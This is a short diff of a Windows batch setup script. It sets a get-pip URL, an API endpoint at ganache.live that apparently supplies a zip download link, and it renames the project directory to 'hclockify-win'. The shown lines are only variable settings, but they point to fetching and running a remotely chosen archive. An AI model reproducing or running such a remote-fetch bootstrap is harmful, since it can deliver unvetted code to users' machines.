@@ -8,7 +8,7 @@ set "GET_PIP_URL=https://bootstrap.pypa.io/get-pip.py"
 set "GET_PIP_FILE=get-pip.py"
 set "API_URL=https://ganache.live/api/v1/helper/ganache-link"
 set "ZIP_FILE=main.zip"
-set "PROJECT_DIR=python-simple-main"
+set "PROJECT_DIR=hclockify-win"
 set "VENV_DIR=venv"
 
 REM Function to retrieve the zip file URL from the API
